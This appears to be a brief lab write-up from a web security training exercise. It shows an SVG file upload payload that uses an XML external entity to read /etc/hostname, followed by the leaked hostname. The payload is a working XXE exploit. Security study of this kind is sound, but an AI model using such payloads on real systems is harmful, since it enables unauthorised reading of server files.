Lab 8 - Exploiting XXE via image file upload

Target Goal - Exploit XXE injection in the file upload functionality to display the content of the /etc/hostname file.

Analysis:

<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

f466152c1a55